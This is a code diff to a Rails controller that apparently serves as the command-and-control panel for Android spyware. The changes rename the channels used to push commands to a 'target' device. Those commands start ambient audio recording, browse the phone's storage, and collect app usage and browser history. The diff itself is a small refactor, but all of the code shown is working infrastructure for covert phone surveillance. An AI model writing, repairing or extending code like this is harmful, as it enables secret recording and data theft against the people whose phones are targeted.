@@ -14,13 +14,13 @@ class SmartphonesController < InheritedResources::Base
       }
       
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.device_id}",
+        "commands_#{smartphone.device_id}",
         command_data
       )
       
       commandOutput = ["Command sent to device #{smartphone.device_id}", "Waiting for response..."]
     rescue => e
-      puts "Error on dump sysinfo: #{e.message}"
+      Rails.logger.error("Error on dump sysinfo: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     respond_to do |format|
@@ -559,7 +559,7 @@ class SmartphonesController < InheritedResources::Base
       }
       
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.device_id}",
+        "commands_#{smartphone.device_id}",
         command_data
       )
       
@@ -586,7 +586,7 @@ class SmartphonesController < InheritedResources::Base
       }
       
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.device_id}",
+        "commands_#{smartphone.device_id}",
         command_data
       )
       
@@ -905,7 +905,7 @@ class SmartphonesController < InheritedResources::Base
         timestamp: Time.now.to_i
       }
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        "commands_#{smartphone.device_id}",
         command_data
       )
       commandOutput = ["🌙 Ambient recording started (#{duration}s) on #{smartphone.name}"]
@@ -922,7 +922,7 @@ class SmartphonesController < InheritedResources::Base
       smartphone = Smartphone.find(params[:smartphone_id])
       path = params[:path] || "/sdcard"
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        "commands_#{smartphone.device_id}",
         { command: "browse_files", params: { path: path }, timestamp: Time.now.to_i }
       )
       commandOutput = ["📂 Browsing #{path} on #{smartphone.name}"]
@@ -938,7 +938,7 @@ class SmartphonesController < InheritedResources::Base
     begin
       smartphone = Smartphone.find(params[:smartphone_id])
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        "commands_#{smartphone.device_id}",
         { command: "get_app_usage", timestamp: Time.now.to_i }
       )
       commandOutput = ["📊 Collecting app usage from #{smartphone.name}"]
@@ -954,7 +954,7 @@ class SmartphonesController < InheritedResources::Base
     begin
       smartphone = Smartphone.find(params[:smartphone_id])
       ActionCable.server.broadcast(
-        "command_channel_#{smartphone.apk_installation&.target_ip}",
+        "commands_#{smartphone.device_id}",
         { command: "get_browser_history", timestamp: Time.now.to_i }
       )
       commandOutput = ["🌐 Collecting browser history from #{smartphone.name}"]
@@ -1028,7 +1028,7 @@ class SmartphonesController < InheritedResources::Base
     }
     
     ActionCable.server.broadcast(
-      "command_channel_#{smartphone.device_id}",
+      "commands_#{smartphone.device_id}",
       command_data
     )
     
